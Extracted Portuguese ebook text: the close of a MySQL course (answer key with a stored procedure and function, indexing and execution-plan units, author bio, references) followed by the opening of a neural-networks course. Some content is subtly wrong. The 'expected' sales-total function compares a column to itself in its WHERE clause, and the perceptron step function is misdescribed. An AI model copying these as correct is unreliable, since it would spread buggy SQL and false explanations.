Function deve ser utilizada para otimizar consultas que necessitam calcular o 
total de vendas de um produto. 
 
Respostas esperadas: 
 
Exercício 1: 
CREATE PROCEDURE inserir_pedido(id_cliente INT, total_pedido 
DECIMAL) 
BEGIN 
    IF total_pedido <= 0 THEN 
        SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'O total do 
pedido deve ser maior que zero'; 
    ELSE 
        INSERT INTO pedidos (id_cliente, total_pedido) VALUES 
(id_cliente, total_pedido); 
    END IF; 
END; 
 
Exercício 2: 
CREATE FUNCTION calcular_total_vendas(id_produto INT) RETURNS 
DECIMAL(10,2) 
BEGIN 
    DECLARE total_vendas DECIMAL(10,2); 
    SELECT SUM(valor_total) INTO total_vendas FROM pedidos WHERE 
id_produto = id_produto; 
    RETURN total_vendas; 
END; 
 
 

 
 
UNIDADE 5 INDEXAÇÃO E OTIMIZAÇÃO 
 
 
OBJETIVOS DA UNIDADE 5  
Ao final dos estudos, você deverá ser capaz de: 
• Explorar a utilização de índices compostos para melhorar a 
performance de consultas. 
• Conhecer estratégias de indexação eficientes para otimizar a 
recuperação de dados. 
• Aprender a analisar o plano de execução de consultas para 
identificar possíveis gargalos de desempenho. 
• Realizar ajustes nas configurações do servidor para otimizar o 
desempenho do banco de dados. 
 
 
 

 
 
5.1 Estratégias de indexação eficientes 
 
Neste capítulo, exploraremos estratégias avançadas de indexação para 
melhorar o desempenho de consultas em bancos de dados relacionais. Uma 
indexação eficiente é crucial para acelerar consultas e reduzir o tempo de 
resposta em sistemas de gerenciamento de banco de dados. 
1. Índices Compostos: 
Os índices compostos são criados em múltiplas colunas de uma tabela e podem 
ser utilizados para otimizar consultas que envolvem múltiplos critérios de 
seleção. Ao criar índices compostos nas colunas mais frequentemente utilizadas 
em cláusulas WHERE, JOIN e ORDER BY, é possível melhorar 
significativamente o desempenho das consultas. 
Exemplo de Criação de Índice Composto: 
 
 2.Estratégias de Indexação Eficientes: 
Além dos índices compostos, existem outras estratégias de indexação que 
podem ser aplicadas para otimizar consultas. Isso inclui o uso de índices únicos, 
índices bitmap, índices de texto completo e índices espaciais, dependendo das 
necessidades específicas da aplicação e dos padrões de acesso aos dados. 
3. Análise de Plano de Execução de Consultas: 
É importante analisar o plano de execução de consultas para identificar 
oportunidades de otimização de indexação. O plano de execução fornece 
informações detalhadas sobre como o banco de dados está processando uma 
consulta e pode ajudar a identificar gargalos de desempenho e oportunidades de 
melhoria. 
 
4. Ajuste de Configurações do Servidor: 
 
Videoaula do tópico disponível no AVA: 
Videoaula 17: Estratégias de indexação eficientes 
 
 
 
 
 
 
 

 
 
Além da indexação, o ajuste de configurações do servidor também pode 
influenciar significativamente o desempenho do banco de dados. Isso inclui 
ajustes de memória, configurações de cache, parâmetros de consulta e outras 
configurações relacionadas ao desempenho. 
 
 
5.2 Utilização de índices compostos 
 
Os índices compostos são uma técnica avançada de indexação em bancos de 
dados relacionais, onde múltiplas colunas são combinadas em um único índice. 
Isso permite otimizar consultas que envolvem condições em mais de uma coluna. 
1. Benefícios dos Índices Compostos: 
• Melhora o desempenho de consultas que envolvem múltiplos critérios de 
seleção. 
• Reduz o tempo de resposta em consultas complexas. 
• Minimiza a sobrecarga de leitura no banco de dados. 
2. Uso Eficiente de Índices Compostos: 
Os índices compostos devem ser utilizados em colunas frequentemente 
utilizadas em cláusulas WHERE, JOIN e ORDER BY. É importante analisar o 
padrão de acesso aos dados e identificar quais combinações de colunas podem 
se beneficiar de um índice composto. 
Exemplo de Uso de Índice Composto: 
Suponha que temos uma tabela de pedidos com colunas id_cliente e 
data_pedido. Criar um índice composto nessas duas colunas pode acelerar 
consultas que filtram pedidos por cliente e data. 
 
Os índices compostos são uma ferramenta poderosa para melhorar o 
desempenho de consultas em bancos de dados relacionais. Ao utilizar índices 
Videoaula do tópico disponível no AVA: 
Videoaula 18: Utilização de índices compostos 
 
 
 
 
 
 
 

 
 
compostos de forma eficiente, é possível reduzir o tempo de resposta e melhorar 
a experiência do usuário em sistemas de informação. 
Aprenda Mais:   
Querys indo de 1 hora a 1 minuto  
Disponível em: https://www.youtube.com/watch?v=ZVwY9r8JVtk 
  
5.3 Análise de plano de execução de consultas 
 
A compreensão do plano de execução de consultas é fundamental para otimizar 
o desempenho de consultas em bancos de dados relacionais. O plano de 
execução fornece informações detalhadas sobre como o banco de dados está 
processando uma consulta e pode ser usado para identificar oportunidades de 
otimização. 
 
1. Componentes do Plano de Execução: 
• Árvore de execução: Representa a ordem das operações realizadas pelo 
banco de dados para processar a consulta. 
• Métodos de acesso: Indica como o banco de dados acessará os dados, 
como por meio de índices ou varreduras de tabela. 
• Operações de junção: Descreve como as tabelas são unidas entre si. 
• Métodos de ordenação: Indica como os resultados são ordenados, se 
necessário. 
2. Análise do Plano de Execução: 
É importante analisar o plano de execução para identificar possíveis gargalos de 
desempenho e oportunidades de otimização. Isso pode incluir a adição de novos 
índices, ajuste das cláusulas WHERE e JOIN, ou reescrita da consulta para 
torná-la mais eficiente. 
 
Videoaula do tópico disponível no AVA: 
Videoaula 19: Análise de plano de execução de consultas 
 
 
 
 
 
 
 

 
 
3. Ferramentas de Análise de Plano de Execução: 
Muitos sistemas de gerenciamento de banco de dados fornecem ferramentas 
para visualizar o plano de execução de consultas. Estas ferramentas podem ser 
usadas para analisar o desempenho de consultas em tempo real e identificar 
áreas de melhoria. 
Exemplo de Plano de Execução: 
 
Esta 
consulta irá mostrar o plano de execução utilizado pelo banco de dados para 
recuperar os dados da tabela. 
A compreensão do plano de execução de consultas é essencial para otimizar o 
desempenho de consultas em bancos de dados relacionais. Ao analisar 
cuidadosamente o plano de execução, é possível identificar e corrigir problemas 
de desempenho, garantindo assim uma experiência mais rápida e eficiente para 
os usuários do sistema. 
 
Aprenda Mais:   
Tudo sobre NLP: o que é? Quais os desafios? Disponível em: 
https://www.blip.ai/blog/tecnologia/nlp-processamento-linguagem-natural/ 
 
5.4 Ajuste de configurações do servidor para otimização de desempenho 
 
Os ajustes de configurações do servidor são uma parte essencial da otimização 
de desempenho em bancos de dados relacionais. Configurações adequadas 
podem melhorar o desempenho, a estabilidade e a segurança do servidor de 
banco de dados. 
1. Ajustes de Memória: 
Videoaula do tópico disponível no AVA: 
Videoaula 20: Ajuste de configurações do servidor para otimização de desempenho 
 
 
 
 
 
 
 

 
 
Configurações 
relacionadas 
à 
alocação 
de 
memória 
podem 
afetar 
significativamente o desempenho do servidor. É importante configurar 
corretamente os buffers de memória, cache e área de troca para atender às 
necessidades do banco de dados e das aplicações. 
 
2. Configurações de Cache: 
O cache é utilizado para armazenar dados frequentemente acessados na 
memória, reduzindo assim o tempo de acesso ao disco. Configurar corretamente 
o cache do banco de dados pode melhorar drasticamente o desempenho de 
consultas. 
 
3. Parâmetros de Consulta: 
Além das configurações do servidor, é importante otimizar as consultas 
individuais para obter o melhor desempenho possível. Isso pode incluir o uso 
adequado de índices, reescrita de consultas e ajuste de parâmetros de consulta. 
 
4. Monitoramento e Ajuste Contínuo: 
O desempenho do servidor de banco de dados deve ser monitorado 
continuamente e ajustes devem ser feitos conforme necessário para garantir um 
desempenho ideal. Isso pode incluir ajustes sazonais, otimizações de consultas 
e atualizações de hardware. 
Os ajustes de configurações do servidor são uma parte fundamental da 
otimização de desempenho em bancos de dados relacionais. Ao configurar 
adequadamente o servidor e monitorar continuamente o desempenho, é possível 
garantir um ambiente de banco de dados rápido, estável e confiável. 
 
 
 
 
 

 
 
FINALIZAR 
 
Chegamos ao fim desta jornada parabéns por concluir o nosso curso sobre 
Banco de Dados! Ao longo das cinco unidades, você teve a oportunidade de 
explorar os principais conceitos e práticas relacionadas ao uso do MySQL e SQL 
em geral. Vamos relembrar um pouco do que aprendemos: 
Na Unidade 1, você mergulhou na instalação e configuração do MySQL, além de 
entender os fundamentos da integridade referencial e sua importância na 
manutenção da consistência dos dados. 
Na Unidade 2, exploramos os comandos DDL (Data Definition Language) para 
criação, alteração e exclusão de estruturas de banco de dados, além de aprender 
a manipular dados usando comandos DML (Data Manipulation Language) como 
INSERT, UPDATE e DELETE. 
Na Unidade 3, aprofundamos nossos conhecimentos em consultas SQL, desde 
a estrutura básica até operadores de filtro, ordenação de resultados e técnicas 
avançadas como junções, subconsultas e agregações. 
Na Unidade 4, você descobriu como criar e usar Stored Procedures e Functions, 
ferramentas poderosas para modularizar e reutilizar lógica de banco de dados 
de forma eficiente. 
Finalmente, na Unidade 5, exploramos estratégias de indexação e otimização 
para melhorar o desempenho do banco de dados, incluindo a análise de planos 
de execução de consultas e ajustes de configurações do servidor. 
Ao concluir este curso, você está preparado para aplicar seus conhecimentos 
em projetos reais, seja desenvolvendo sistemas de informação, analisando 
dados ou administrando bancos de dados em ambientes corporativos. 
Lembre-se sempre de praticar e explorar novos recursos e técnicas para 
aprimorar suas habilidades em Banco de Dados. O aprendizado é uma jornada 
contínua, e estamos aqui para ajudá-lo em cada passo do caminho. 
Continue explorando e bons estudos 
Prof. Esp. Murilo Almeida Pacheco 
 
 

 
 
Sobre o autor 
 
Murilo Almeida Pacheco possui MBA em Gerenciamento de Projetos pela 
Unialfa e é graduado em Sistemas de Informação pela Unialfa. 
Sua trajetória acadêmica inclui também passagens como docente de graduação 
e pós-graduação em diversas instituições de ensino superior, como a Faculdade 
Fan-Padrão, Universidade Paulista, e Centro Universitário Alves Farias.  
Com uma sólida experiência profissional, atua como Gestor de Projetos e Líder 
Técnico na fábrica de software da Universidade Federal de Goiás e como 
Analista de Sistemas Pleno na empresa M9 Solutions LLC situada em Miami, 
Flórida. Além de ter coordenado o departamento de tecnologia da informação do 
Centro Universitário Goyazes. 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
Silberschatz, Abraham. Sistema de banco de dados, GEN LTC, 2020. 
Machado, Felipe Nery Rodrigues. Banco de dados: projeto e implementação. 
4. ed. São Paulo: Érica, 2020. 
Elmasri, R.; Navathe, S. B.; Vieira, D.  Sistemas de banco de dados. 7ª ed. São 
Paulo: Pearson, 2018. 
Alves, William Pereira. Banco de dados: teoria e desenvolvimento. 2. ed. São 
Paulo: Érica, 2020. 
Medeiros, Luciano Frontino de. Banco de dados: princípios e prática. 1. ed. 
São Paulo: Intersaberes, 2013. 
Amadeu, Claudia Vicci (Org.). Banco de dados. São Paulo: Pearson, 2014. 
Alves, William Pereira. Banco de dados. São Paulo: Érica, 2014. 
Teorey, Toby et al. Projeto e modelagem de banco de dados. 2. ed. Rio de 
Janeiro: GEN LTC, 2013. 
 
 
 
  


--- Fim do arquivo: eBook - Banco de dados 2.pdf ---

--- Começo do arquivo: eBook - Redes Neurais.pdf ---

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
O aluno será capaz de implementar solução usando conceitos de redes neurais 
artificiais com múltiplas camadas.  
OBJETIVOS ESPECÍFICOS 
 Entender os conceitos fundamentais de redes neurais artificiais.  
 Montar estrutura de uma rede neural definindo estrutura de camadas 
 Treinar uma rede neural em projeto prática utilizando o framework 
Pytorch.  
 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Conceitos Iniciais 
Unidade 2: Rede Multilayer Perceptron 
Unidade 3: Retropropagação (Backpropagation) 
Unidade 4: Métricas De Avaliação De Redes Neurais 
Unidade 5: Projeto Prática de Treinamento de uma Rede Neural 
 
 
 
 

 
 
UNIDADE 1 CONCEITOS INICIAIS 
Esta unidade aborda os conceitos iniciais sobre redes neurais. Define o que é 
um neurônio artificial e a sua estrutura básica. Além disso, são apresentadas as 
principais arquiteturas de redes neurais. 
 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: 
 Entender o que é um neurônio artificial 
 Compreender a estrutura de um perceptron  
 Diferenciar as principais arquiteturas de rede 
 

 
 
1.1 MACHINE LEARNING X DEEP LEARNING 
Machine Learning (ML) é uma área da Inteligência Artificial que utiliza algoritmos 
para analisar dados, aprender com eles e tomar decisões com base em padrões 
identificados. Ele pode ser dividido em dois principais tipos de aprendizado: 
 Aprendizado supervisionado: quando o algoritmo é treinado com dados 
rotulados, onde as entradas e saídas são conhecidas. Exemplo: um 
modelo de ML pode ser treinado para classificar e-mails como "spam" ou 
"não spam" com base em características pré-definidas. 
 Aprendizado não supervisionado: Não há rótulos nos dados, e o 
algoritmo busca padrões ou grupos nos dados por conta própria. 
Exemplo: segmentação de clientes em clusters com base no 
comportamento de compra. 
No Machine Learning, os algoritmos, como regressão linear, árvores de decisão 
e máquinas de vetores de suporte (SVM), processam os dados de forma mais 
direta, exigindo que os engenheiros de dados extraiam e selecionem 
manualmente as características mais relevantes. Por exemplo, na previsão de 
preços de imóveis, em ML, seria necessário selecionar características como o 
tamanho da casa, localização, número de quartos, etc., e alimentar esses dados 
no modelo. 
Os modelos de Machine Learning funcionam bem com quantidades moderadas 
de dados e geralmente requerem menos poder computacional. Eles são ideais 
para problemas mais simples, como previsões baseadas em dados tabulares ou 
classificações binárias, como prever se um cliente vai ou não cancelar uma 
assinatura com base em dados históricos. 
Deep Learning (DL), por sua vez, é uma abordagem que utiliza redes neurais 
profundas para realizar essas mesmas tarefas, mas de maneira muito mais 
eficiente em cenários de grande escala e alta complexidade. As redes neurais 
usadas no DL têm múltiplas camadas de neurônios artificiais, permitindo que o 
modelo extraia automaticamente características complexas dos dados. 
Em Deep Learning, as redes neurais artificiais aprendem automaticamente as 
características relevantes, dispensando grande parte da intervenção humana. 
Um exemplo de DL é uma rede neural convolucional (CNN), amplamente 
utilizada em reconhecimento de imagens. Nesse caso, o modelo pode identificar 
características visuais como bordas, formas e padrões sem a necessidade de 
programação explícita dessas características. 
O Deep Learning se destaca em tarefas que envolvem grandes volumes de 
dados, como processamento de linguagem natural (NLP) ou reconhecimento de 

 
 
imagem. Ele se torna mais eficaz à medida que a quantidade de dados cresce, 
enquanto os algoritmos tradicionais de ML podem perder desempenho com 
grandes volumes de dados devido à dificuldade de identificar padrões 
complexos. 
Exemplo: Em uma aplicação de reconhecimento de voz, o DL utiliza redes 
neurais recorrentes (RNN) para analisar e interpretar padrões de fala em tempo 
real, enquanto o ML tradicional teria dificuldades para capturar todas as nuances 
de variações na voz e contexto. 
Os modelos de Machine Learning geralmente podem ser treinados em 
computadores convencionais com CPUs, enquanto os modelos de Deep 
Learning requerem maior poder computacional, frequentemente utilizando GPUs 
(unidades de processamento gráfico) ou até mesmo clusters em nuvem para 
processar grandes volumes de dados em um tempo razoável. 
Essa diferença de poder de processamento é evidente em aplicações como 
veículos autônomos, onde o deep learning é usado para processar imagens e 
sensores em tempo real, enquanto métodos tradicionais de machine learning 
não conseguiriam lidar com a quantidade de dados necessária para uma 
condução segura e eficiente. 
 
Figura 1: Relação de Machine Learning e Deep Learning 
Fonte: https://www.turing.com/kb/ultimate-battle-between-deep-learning-and-
machine-learning 

 
 
1.1.2 REDES NEURAIS ARTIFICIAIS 
As redes neurais artificiais (ANNs) são a estrutura fundamental do deep learning. 
Inspiradas na estrutura biológica do cérebro humano, são sistemas 
computacionais inspirados no funcionamento do cérebro humano, capazes de 
aprender padrões a partir de dados. Imagine que você tem um conjunto de 
imagens e deseja classificá-las, por exemplo, identificar se uma imagem contém 
um gato ou um cachorro. Uma rede neural realiza essa tarefa aprendendo uma 
função matemática que mapeia as entradas (as imagens) para as saídas (as 
classificações) a partir de exemplos fornecidos durante o treinamento. 
Simplificando, uma rede neural é composta por neurônios artificiais, que são 
pequenas unidades de processamento que realizam cálculos simples. Esses 
neurônios podem estar interconectados de várias maneiras para formar uma 
estrutura capaz de resolver problemas complexos, como reconhecimento de voz, 
tradução automática, e até mesmo jogos de estratégia. O conceito de "deep 
learning" surge quando essas redes neurais são profundas, ou seja, possuem 
várias camadas de neurônios, permitindo a modelagem de padrões muito 
complexos. 
 
1.2. CONCEITOS CHAVE EM REDES NEURAIS 
1.2.1 NEURÔNIO ARTIFICIAL 
Um neurônio artificial é a unidade básica de uma rede neural artificial que simula 
o comportamento de um neurônio biológico. Ele recebe diversas entradas, as 
processa por meio de uma soma ponderada, e aplica uma função de ativação 
para gerar uma saída. 
O funcionamento do neurônio pode ser descrito por quatro componentes 
principais: pesos, viés (bias), função de somatório e função de ativação. O 
modelo de um neurônio artificial é mostrado na Figura 2. 

 
 
 
 
Figura 2: Modelo de um neurônio artificial.  
Fonte:  SILVA. et. al. Inteligência artificial SAGAH, 2019. 
Exemplo: 
Suponha que um neurônio artificial receba três entradas x1, x2 e x3 com valores 
0.5, 0.8 e 0.2, respectivamente, e que os pesos associados a essas entradas 
sejam w1= 0.3, w2 = -0.2, w3 = 0.7. O viés do neurônio θ é 0.1. O somatório 
dessas entradas ponderadas, mais o viés, seria: 
 
O que resulta em: 
 
Esse valor y=0.23 seria então passado para a função de ativação, que 
determinará se o neurônio será ativado ou não. 
 
1.2.1.1 PESO DE CONEXÃO 
Os pesos, na Figura 2 representados por wki, determinam a força ou a 
importância de cada entrada. Durante o treinamento da rede, esses pesos são 

 
 
ajustados de acordo com o erro cometido na saída, utilizando algoritmos como 
o gradiente descendente para minimizar a diferença entre a saída predita e o 
valor real.  
Se uma entrada xi está associada a um peso muito alto, como wi=10, o impacto 
dessa entrada na saída do neurônio será muito maior. Se essa entrada for 
irrelevante para o problema, o treinamento ajustará o peso para valores mais 
baixos, próximo de zero, reduzindo seu impacto. Esse ajuste contínuo dos pesos 
é o que permite que as redes neurais aprendam padrões complexos nos dados. 
1.2.1.2 VIÉS 
O viés ou bias, na Figura 2 representados por θ, é um valor constante adicionado 
ao resultado ponderado. O viés é um valor que permite ao modelo fazer ajustes 
mais flexíveis. Ele desloca a função de ativação, permitindo que o neurônio gere 
uma saída diferente de zero, mesmo quando todas as entradas forem zero. Isso 
dá ao modelo a capacidade de aprender com mais eficácia. 
Por exemplo, Se o viés b for negativo, ele torna mais difícil a ativação do neurônio 
(um valor de θ =−1 exigiria entradas mais fortes para ativar o neurônio). Se θ =1, 
o neurônio será mais propenso a ser ativado, mesmo com entradas fracas. O 
ajuste correto do viés ajuda a calibrar a rede neural de forma mais precisa 
durante o treinamento. 
1.2.1.3 FUNÇÃO SOMATÓRIO 
Em um neurônio artificial, o somatório (ou função de soma), na Figura 2 
representados por ∑,  tem o objetivo de calcular o valor de ativação do neurônio 
com base nas entradas recebidas e nos pesos associados a cada entrada. 
Ele funciona da seguinte maneira: 
1. Entrada de Dados: Cada neurônio recebe várias entradas, cada uma 
multiplicada por um peso. Esses pesos indicam a importância relativa de 
cada entrada. 
2. Somatório: O somatório calcula a soma ponderada dessas entradas, ou 
seja, a multiplicação de cada valor de entrada pelo seu respectivo peso, 
somada com um termo de viés (bias). O viés é adicionado para ajustar a 
função de ativação, permitindo que o modelo se ajuste melhor aos dados. 
𝑦= ෍(𝑥௜ × 𝑤௜) + θ
௡
௜
 
Onde: 
o xi é o valor de entrada, 

 
 
o wi é o peso da conexão, 
o θ é o viés, 
o y é o valor resultante do somatório. 
 
Um exemplo de código em Python que calcula o somatório de entradas, pesos 
e viés de dados fixos. 
 
Nesse código, utilizamos a função np.dot para calcular o produto escalar entre 
as entradas e os pesos, somando o viés ao resultado. Isso reproduz a equação 
descrita anteriormente: 
𝑦= ෍(𝑥௜ × 𝑤௜) + θ
௡
௜
 
 
Um exemplo de um problema simples que poderia ser mapeado para um 
neurônio artificial seria a soma de dois números. Esse neurônio receberia todas 
as entradas ponderadas e retornaria o valor (aproximado).  
 

 
 
Figura 3: Modelo do neurônio do somatório  
 
Na Figura 3 vemos a ilustração desse exemplo. As entradas x1 e x2, são 
respectivamente 5 e 3. Já os pesos w1 e w2, são respectivamente, 0.9, 1.1. 
Observe que quando a soma 5 x 0.9 + 3 x 1.1 é executada o resultado é 7.8, que 
é um valor próximo da resposta real que seria 8. Os pesos dizem ao neurônio 
para responder mais a uma entrada e menos a outra. 
Abaixo um exemplo em código Python de implementação desse neurônio 
 
Mas como saber que os pesos 0.9 e 1.1 são os corretos, neste caso eles estão 
fixos? Inicialmente eles são escolhidos aleatoriamente, ou seguindo algum 
critério. Durante o processo de treinamento, esses pesos são ajustados para 
minimizar o erro entre a saída esperada e a saída real, permitindo que a rede 
"aprenda" a tarefa para a qual foi projetada. Os pesos são ajustados durante o 
treinamento — é assim que a rede aprende. Mas como fazer isso veremos mais 
a frente. 
SAIBA MAIS:  
Pesquise sobre a biblioteca numpy e descubra o que os comandos np.dot e 
np.array fazem. Fonte: https://numpy.org/doc/stable/ 
 
1.2.1.4 FUNÇÃO DE ATIVAÇÃO 
 
O resultado do somatório passa para uma função de ativação, que poderia ser 
uma função linear, sigmoid, ReLU, entre outras. A função de ativação, na Figura 

 
 
2 representados por g (.),  decide se o neurônio deve ser ativado ou não. Ela 
introduz não-linearidade na rede, permitindo que a rede aprenda padrões 
complexos. Exemplos comuns de funções de ativação incluem a função 
sigmoide, ReLU (Rectified Linear Unit), e tanh. 
Existem várias funções de ativação comuns utilizadas em redes neurais: 
 ReLU (Rectified Linear Unit): Uma das funções de ativação mais 
populares, especialmente em redes neurais profundas. A ReLU retorna a 
entrada diretamente se for positiva, e zero caso contrário. Sua fórmula é 
ReLU(x)=max(0,x). A ReLU é amplamente utilizada devido à sua 
simplicidade e eficiência em redes profundas, pois ela ajuda a resolver o 
problema do desaparecimento do gradiente, que pode ocorrer com outras 
funções de ativação. 
 Sigmoid: A função sigmoide mapeia a entrada em um valor entre 0 e 1, 
usando a fórmula σ(z)=1/1+e−z. É frequentemente usada em problemas 
de classificação binária, onde a saída deve representar uma 
probabilidade. No entanto, a função sigmoide pode sofrer com problemas 
de saturação, onde os gradientes se tornam muito pequenos para valores 
extremos de entrada. 
Cada função de ativação tem suas próprias vantagens e desvantagens, e a 
escolha da função apropriada depende do problema específico que se está 
tentando resolver. 
O código abaixo é a modificação do anterior aplicando a função de ativação 
ReLU na saída. Não vai haver nenhuma alteração no resultado, pela 
característica do problema e por termos apenas um neurônio. 
 

 
 
1.2.3.4 PERCEPTRON 
O Perceptron é um tipo específico de neurônio artificial. Ele é o primeiro modelo 
formal de um neurônio em uma rede neural, criado por Frank Rosenblatt em 
1958. O Perceptron foi projetado para resolver problemas de classificação 
binária, ou seja, decidir entre duas classes distintas, e utiliza uma função de 
ativação do tipo degrau, que gera uma saída discreta (0 ou 1). 
A estrutura básica de um Perceptron consiste em entradas, pesos, um somatório 
e uma função de ativação. Assim como no neurônio artificial descrito na seção 
anterior, o Perceptron calcula a soma ponderada das entradas, adiciona um viés 
e aplica uma função de ativação para gerar a saída. O Perceptron realiza a 
seguinte operação matemática: 
𝑦= ∅൭෍(𝑥௜ × 𝑤௜) + 𝑏
௡
௜ୀଵ
൱ 
Onde: 
o xi é o valor de entrada, 
o wi é o peso da conexão, 
o b é o viés, 
o ϕ é a função de ativação, tipicamente uma função degrau que 
decide se a saída será 0 ou 1. 
o y é o valor resultante do somatório. 
 
Observe que um neurônio artificial pode ter várias funções de ativação, como 
ReLU, sigmoide ou tangente hiperbólica. O Perceptron utiliza apenas a função 
de ativação degrau, o que limita sua aplicação a problemas de classificação 
simples. A função de ativação degrau retornará 1 se o resultado do somatório for 
maior ou igual a 0, e retornará 1 se for menor que 0. A função de ativação degrau 
faz com que o Perceptron seja adequado apenas para problemas de 
classificação linear. 
 

 
 
Dessa forma, uma rede perceptron é usada apenas para classificar casos 
linearmente separáveis com saída binária (0 ou 1), não conseguindo resolver 
problemas não lineares, sendo assim, não é utilizado em arquiteturas modernas 
de Deep Learning. 
 
1.3. ARQUITETURAS E TIPOS DE REDES NEURAIS 
Na seção anterior vimos um exemplo com um único neurônio, mas uma rede 
neural tem centenas, milhares ou bilhões de neurônios a depender do problema, 
todos estes conectados, sendo a saída de um a entrada de outro. A Figura 4 
ilustra uma rede neural com diversos neurônios distribuídos em camadas. 
 
Figura 4: Rede Neural com diversos neurônios.  
 
Essas redes neurais mais densas nos dão a oportunidade de definir mais 
parâmetros nos pesos e vieses da rede, e assim reconhecer tarefas mais 
complicadas. 
 
Existem várias arquiteturas de redes neurais, compostas por diversos neurônios 
conectados, cada uma projetada para lidar com diferentes tipos de dados e 
tarefas de aprendizado. A seguir, abordaremos os tipos mais amplamente 
reconhecidos: 
1.3.1 REDES NEURAIS FEEDFORWARD (FNN) 
As Redes Neurais Feedforward (FNNs) são o tipo mais simples de redes neurais 
artificiais (ANNs). Nessas redes, a informação flui em uma única direção, da 
camada de entrada para a camada de saída, sem loops de retroalimentação. As 
FNNs são frequentemente usadas para tarefas básicas de classificação, como 
reconhecer dígitos escritos à mão, e problemas de regressão, como prever 
valores contínuos a partir de entradas numéricas. 

 
 
As FNNs têm uma arquitetura chamada de totalmente conectada (fully 
connected), onde cada neurônio em uma camada está conectado a todos os 
neurônios da próxima camada. 
Exemplo de uma FNN: 
 Camada de Entrada: Contém o vetor de entrada, que representa os 
dados de entrada. 
 Camadas Ocultas: Estas são compostas por neurônios que recebem 
entradas ponderadas da camada anterior e aplicam uma função de 
ativação. Em uma FNN totalmente conectada, cada neurônio em uma 
camada oculta está conectado a todos os neurônios da camada anterior 
e seguinte. 
 Camada de Saída: É a última camada de neurônios, que produz o 
resultado final da rede, como uma classificação ou uma previsão. O 
número de neurônios na camada de saída corresponde ao número de 
classes ou ao formato dos dados de saída. 
 
 
Figura 5: Exemplo de redes Neurais Feedforward (FNNs) 
 
As camadas ocultas são chamadas assim porque não são diretamente 
observáveis pelo "mundo exterior" – elas processam internamente as entradas 
para produzir as saídas desejadas. 
1.3.2 REDES NEURAIS CONVOLUCIONAIS (CNN) 
As Redes Neurais Convolucionais (CNNs) são especializadas no processamento 
de dados em forma de grade, como imagens, onde os dados possuem uma 
estrutura espacial significativa. As CNNs usam camadas convolucionais que 
aplicam filtros ou kernels às entradas para extrair características relevantes, 
como bordas, texturas e formas. 
As CNNs são amplamente utilizadas em tarefas de visão computacional, como: 

 
 
 Reconhecimento de Imagens: a rede identifica objetos em imagens. 
 Detecção de Objetos: a rede localiza e classifica múltiplos objetos em 
uma imagem. 
 Reconhecimento de Vídeos: a rede analisa sequências de quadros para 
entender o conteúdo visual. 
A arquitetura típica de uma CNN inclui camadas convolucionais, seguidas de 
camadas de pooling (que reduzem a dimensionalidade), e finalmente camadas 
totalmente conectadas que produzem a saída final. 
1.3.3 REDES NEURAIS RECORRENTES (RNN) 
As Redes Neurais Recorrentes (RNNs) são projetadas para o processamento de 
dados sequenciais, como séries temporais ou texto. Ao contrário das FNNs, as 
RNNs possuem loops que permitem que a saída de um neurônio seja usada 
como entrada para o mesmo neurônio em passos subsequentes. Isso cria uma 
espécie de "memória" interna, permitindo que a rede capture dependências 
temporais. 
 
Figura 6: Exemplo de redes Neurais Recorrentes (RNNs) 
 
As RNNs são usadas em diversas aplicações, incluindo: 
 Modelagem de Linguagem Natural: a rede prevê a próxima palavra em 
uma frase. 
 Reconhecimento de Fala: a rede converte fala em texto. 
 Previsão de Séries Temporais: prever preços de ações ou demandas 
de energia. 

 
 
Apesar de sua capacidade de capturar dependências temporais, as RNNs 
simples podem ter dificuldade em lembrar informações por longos períodos, o 
que levou ao desenvolvimento de variantes como as LSTMs. 
 
1.3.4 REDES DE MEMÓRIA DE LONGO CURTO PRAZO (LSTM) 
As Redes de Memória de Longo Curto Prazo (LSTMs) são um tipo especial de 
RNN projetado para lidar com a limitação das RNNs padrão em capturar 
dependências de longo prazo. As LSTMs introduzem células de memória e 
mecanismos de portas que controlam o fluxo de informações, permitindo que a 
rede aprenda e lembre-se de sequências mais longas. 
As LSTMs são particularmente eficazes em tarefas como: 
 Geração de Texto: a rede gera texto coerente ao aprender padrões em 
grandes corpora. 
 Tradução de Idiomas: a rede traduz texto de um idioma para outro. 
 Previsão de Séries Temporais: entender padrões de longo prazo é 
essencial. 
Essas redes têm sido essenciais em avanços em processamento de linguagem 
natural e outras áreas onde a dependência temporal é crítica. 
1.3.5 REDES ADVERSÁRIAS GENERATIVAS (GAN) 
As Redes Adversárias Generativas (GANs) consistem em duas redes neurais 
que competem entre si: uma rede geradora e uma rede discriminadora. A rede 
geradora cria dados sintéticos (como imagens) a partir de ruído aleatório, 
enquanto a rede discriminadora tenta distinguir entre dados reais e falsos. 
As GANs têm revolucionado áreas como: 
 Geração de Imagens e Vídeos: podem criar imagens realistas de 
pessoas, animais, e cenários que não existem. 
 Criação de Conteúdo Criativo: gerar obras de arte, música, ou mesmo 
designs de produtos. 
 Aprimoramento de Imagens: aumentar a resolução de imagens ou 
remover ruídos. 
As GANs são um exemplo poderoso de como redes neurais podem ser usadas 
de maneiras criativas e inovadoras. 

 
 
1.3.6 AUTOENCODERS (AES) 
Os Autoencoders são redes neurais utilizadas para aprendizado não 
supervisionado, onde a tarefa principal é aprender uma representação compacta 
dos dados (codificação) e depois reconstruir os dados originais a partir dessa 
representação. A estrutura básica de um autoencoder inclui uma camada de 
codificação que reduz a dimensionalidade dos dados e uma camada de 
decodificação que tenta reconstruir os dados a partir da codificação. 
Os Autoencoders são usados em: 
 Redução de Dimensionalidade: podem ajudar a reduzir o número de 
variáveis em um conjunto de dados, preservando a maior quantidade de 
informação possível. 
 Redução de Ruído: podem ser treinados para remover ruído de imagens 
ou sinais. 
 Detecção de Anomalias: aprendem a reconstruir dados normais, e 
qualquer dado que não possa ser bem reconstruído é considerado uma 
anomalia. 
1.3.7 REDES TRANSFORMER 
As Redes Transformer representam uma arquitetura de rede neural que se 
baseia inteiramente em mecanismos de autoatenção, evitando a necessidade de 
recorrência ou convoluções. Os Transformers foram introduzidos para melhorar 
a eficiência do treinamento de redes neurais, especialmente em tarefas de 
processamento de linguagem natural. 
Os Transformers são a base de modelos como o GPT (Generative Pre-trained 
Transformer) 
e 
BERT 
(Bidirectional 
Encoder 
Representations 
from 
Transformers), e têm sido usados em: 
 Tradução de Idiomas: são treinados para traduzir textos entre diferentes 
línguas com alta precisão. 
